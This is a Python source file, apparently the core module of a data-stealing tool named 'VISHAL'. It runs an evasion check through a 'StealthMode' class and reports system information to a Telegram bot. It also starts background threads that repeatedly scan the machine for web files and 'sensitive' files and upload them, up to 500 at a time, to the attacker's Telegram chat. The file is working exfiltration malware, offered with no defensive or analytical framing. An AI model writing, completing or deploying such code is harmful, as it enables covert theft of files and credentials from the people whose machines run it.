"""
VISHAL Core Module
"""
import os
import sys
import time
import threading
from datetime import datetime

from .config import Config
from .utils import Utils
from .sender import TelegramSender
from .scanner import FileScanner
from .stealth import StealthMode

class Vishal:
    """Main VISHAL Class"""
    
    _instance = None
    _initialized = False
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not Vishal._initialized:
            self.config = Config()
            self.utils = Utils()
            self.stealth = StealthMode()
            self.sender = TelegramSender(Config.BOT_TOKEN, Config.CHAT_ID)
            self.scanner = FileScanner(self.sender)
            self.start_time = datetime.now()
            Vishal._initialized = True
    
    def activate(self):
        """Activate VISHAL module"""
        # Check environment
        safe, issues = self.stealth.check_environment()
        
        # Get system info
        system_info = self.utils.get_system_info()
        
        # Send startup message
        self.sender.send_startup_message(system_info)
        
        if not safe:
            self.sender.send_message(f"⚠️ <b>Warning:</b> {', '.join(issues)}")
        
        # Start scanning in background
        self._start_background_tasks()
        
        return self
    
    def _start_background_tasks(self):
        """Start background threads"""
        
        # Quick scan thread
        def quick_scan():
            time.sleep(5)  # Wait for startup
            files = self.scanner.scan_web_files()
            self.sender.send_bulk(files[:20])
        
        threading.Thread(target=quick_scan, daemon=True).start()
        
        # Continuous scan thread
        threading.Thread(target=self.scanner.continuous_scan, 
                        args=(300,), daemon=True).start()
        
        # Stats thread
        def stats_reporter():
            while True:
                time.sleep(3600)  # Every hour
                self.sender.send_summary()
        
        threading.Thread(target=stats_reporter, daemon=True).start()
    
    def collect_all(self):
        """Collect all files immediately"""
        self.sender.send_message("⚡ <b>Collecting all files...</b>")
        
        files = self.scanner.scan_and_send(max_files=500)
        
        msg = f"✅ Collected {len(files)} files"
        self.sender.send_message(msg)
        
        return files
    
    def collect_sensitive(self):
        """Collect sensitive files"""
        self.sender.send_message("🔐 <b>Collecting sensitive files...</b>")
        
        files = self.scanner.scan_sensitive_files()
        
        for file_path in files[:50]:
            self.sender.send_file(file_path)
            time.sleep(2)
        
        return files
    
    def get_status(self):
        """Get module status"""
        uptime = datetime.now() - self.start_time
        stats = self.scanner.get_stats()
        
        status = {
            "uptime": str(uptime).split('.')[0],
            "scanned": stats['scanned'],
            "sent": stats['sent'],
            "skipped": stats['skipped'],
            "queue": self.sender.queue.qsize(),
            "active": self.scanner.running
        }
        
        return status
    
    def stop(self):
        """Stop VISHAL module"""
        self.scanner.stop()
        self.sender.send_message("🛑 <b>VISHAL Module Stopped</b>")
        self.sender.stop()